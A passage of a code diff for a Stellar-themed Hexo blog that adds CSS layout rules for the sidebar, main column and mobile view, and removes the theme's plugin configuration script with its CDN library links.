+.l_body .l_left {
+  z-index: 8;
+  width: var(--width-left);
+  flex-shrink: 0;
+  position: sticky;
+  position: -webkit-sticky;
+  top: 8px;
+}
+.l_body .l_main {
+  flex-shrink: 1;
+  flex-grow: 1;
+  width: 320px;
+  max-width: var(--width-main);
+}
+.main-mask {
+  position: fixed;
+  pointer-events: none;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.2);
+  z-index: 9;
+  opacity: 0;
+  trans1: opacity;
+}
+@media screen and (max-width: $device-mobile-max) {
+  .mobile-only {
+    display: block !important;
   }
-
-  // stellar js
-  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
-
-  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
-  // optional plugins
-  if ('true' == 'true') {
-    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js","transition":"fade"});
+  .l_body {
+    padding: 0;
   }
-  if ('true' == 'true') {
-    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  .l_body .l_left {
+    position: fixed;
+    transform: translateX(-320px);
+    margin: 0;
+    left: 8px;
+    box-shadow: $boxshadow-card-float;
+    z-index: 10;
   }
-  if ('' == 'true') {
-    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js","distance":"16px","duration":800,"interval":100,"scale":1});
+  .l_body .l_main {
+    max-width: 100%;
   }
-  if ('true' == 'true') {
-    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","flying_pages":"https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"});
+  .l_body.mobile .l_left {
+    transition: transform 0.38s ease-out;
   }
-  if ('true' == 'true') {
-    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js","css":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css","selector":null});
+  .l_body.mobile.sidebar .l_left {
+    transform: translateX(0px);
   }
-  if ('false' == 'true') {
-    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  .l_body.mobile.sidebar .main-mask {
+    opacity: 1;
+    pointer-events: inherit;
   }
-  if ('true' == 'true') {
-    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
-  }
-</script>
-
-<!-- required -->
-<script src="/js/main.js?v=1.26.8" async></script>
-
-<!-- optional -->
-
-
-
-
-
-
-<!-- inject -->
-<script type="text/javascript" src="/custom/js/ZYCode.js"></script>
-</div></body></html>
+}
